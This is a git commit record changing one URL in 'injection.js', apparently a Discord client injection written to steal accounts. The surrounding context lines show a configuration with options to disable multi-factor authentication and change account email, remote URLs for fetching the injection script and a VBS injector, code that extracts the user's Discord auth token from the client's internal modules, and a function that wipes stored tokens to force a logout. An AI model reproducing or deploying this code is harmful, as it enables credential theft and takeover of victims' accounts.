4943f195e71d940a872365f92bd71afddbdf07b9
k4itrun <103044629+k4itrun@users.noreply.github.com>
2025-04-21 16:46:44 -0500

    Update injection.js

--- injection.js
+++ injection.js
@@ -39,7 +39,7 @@ const CONFIG = {
     auto_mfa_disabler: '%AUTO_MFA_DISABLER%',
     auto_email_update: '%AUTO_EMAIL_UPDATE%',
     injection_url: 'https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js',
-    injector_url: 'https://raw.githubusercontent.com/k4itrun/discord-vbs-injector/main/injector.vbs',
+    injector_url: 'https://raw.githubusercontent.com/k4itrun/vbs-injector/main/injector.vbs',
     get: {
         token: () => execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`),
         logout: () => execScript(`function getLocalStoragePropertyDescriptor() {const o = document.createElement("iframe");document.head.append(o);const e = Object.getOwnPropertyDescriptor(o.contentWindow, "localStorage");return o.remove(), e};Object.defineProperty(window, "localStorage", getLocalStoragePropertyDescriptor());const localStorage = getLocalStoragePropertyDescriptor().get.call(window);console.log(localStorage.token);if(localStorage.token) {localStorage.token = null,localStorage.tokens = null,localStorage.MultiAccountStore = null,location.reload();} else {return"This is an intentional error";}`),
